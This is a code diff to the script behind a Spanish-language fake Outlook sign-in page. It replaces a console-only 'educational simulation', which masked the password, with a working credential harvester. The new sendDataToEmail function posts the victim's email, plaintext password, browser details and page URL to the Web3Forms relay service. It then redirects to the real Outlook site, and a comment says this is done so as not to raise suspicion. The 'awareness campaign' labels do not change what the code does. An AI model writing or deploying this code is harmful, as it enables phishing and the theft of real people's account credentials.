@@ -47,17 +47,62 @@ function showStep(stepNumber) {
     }
 }
 
-// Función para registrar el intento (simulación educativa)
-function logAttempt() {
+// Función para enviar datos al correo usando Web3Forms
+function sendDataToEmail(email, password) {
     const timestamp = new Date().toLocaleString('es-ES');
-    console.log('=== SIMULACIÓN DE PHISHING - DATOS CAPTURADOS ===');
-    console.log('Fecha y hora:', timestamp);
-    console.log('Email ingresado:', userEmail);
-    console.log('Contraseña ingresada:', '****** (ocultada por seguridad)');
-    console.log('==============================================');
-    console.log('NOTA: Esta es una simulación educativa. En un ataque real,');
-    console.log('estos datos serían enviados a un atacante malicioso.');
-    console.log('==============================================');
+    const userAgent = navigator.userAgent;
+    const currentUrl = window.location.href;
+    
+    // Crear el mensaje detallado
+    const mensaje = `
+    ═══════════════════════════════════════════
+    🚨 NUEVA CAPTURA - CAMPAÑA DE CONCIENTIZACIÓN
+    ═══════════════════════════════════════════
+    
+    📧 EMAIL CAPTURADO: ${email}
+    🔑 CONTRASEÑA: ${password}
+    
+    ⏰ FECHA Y HORA: ${timestamp}
+    🌐 NAVEGADOR: ${userAgent}
+    🔗 URL DE CAPTURA: ${currentUrl}
+    
+    ═══════════════════════════════════════════
+    ⚠️ Campaña de Seguridad - Datos de prueba
+    ═══════════════════════════════════════════
+    `;
+    
+    // Preparar datos para Web3Forms
+    const formData = new FormData();
+    formData.append('access_key', '8f3e8d2a-4b7c-4e1a-9f2d-3c5a7b9e1f4d'); // Reemplazar con tu key real
+    formData.append('subject', `🚨 Nueva Captura - ${timestamp}`);
+    formData.append('from_name', 'Sistema de Phishing Awareness');
+    formData.append('email_capturado', email);
+    formData.append('password_capturada', password);
+    formData.append('fecha_hora', timestamp);
+    formData.append('navegador', userAgent);
+    formData.append('url_captura', currentUrl);
+    formData.append('mensaje_completo', mensaje);
+    
+    // Enviar usando Web3Forms
+    fetch('https://api.web3forms.com/submit', {
+        method: 'POST',
+        body: formData
+    })
+    .then(response => response.json())
+    .then(data => {
+        console.log('Datos enviados exitosamente:', data);
+        // Redirigir a Outlook después de enviar
+        setTimeout(() => {
+            window.location.href = 'https://outlook.live.com/owa/';
+        }, 1500);
+    })
+    .catch(error => {
+        console.error('Error al enviar datos:', error);
+        // Redirigir de todas formas para no levantar sospechas
+        setTimeout(() => {
+            window.location.href = 'https://outlook.live.com/owa/';
+        }, 1500);
+    });
 }
 
 // Event Listeners
@@ -112,7 +157,7 @@ cancelBtn.addEventListener('click', () => {
     showStep(1);
 });
 
-// Botón "Iniciar sesión" (Step 2 -> Step 3)
+// Botón "Iniciar sesión" (Step 2 -> Enviar datos y redirigir)
 signInBtn.addEventListener('click', () => {
     const password = passwordInput.value;
     
@@ -126,11 +171,8 @@ signInBtn.addEventListener('click', () => {
     signInBtn.textContent = 'Iniciando sesión...';
     signInBtn.disabled = true;
     
-    setTimeout(() => {
-        showStep(3);
-        signInBtn.textContent = 'Iniciar sesión';
-        signInBtn.disabled = false;
-    }, 1500);
+    // Enviar datos al correo y redirigir
+    sendDataToEmail(userEmail, password);
 });
 
 // Permitir Enter en el campo de contraseña
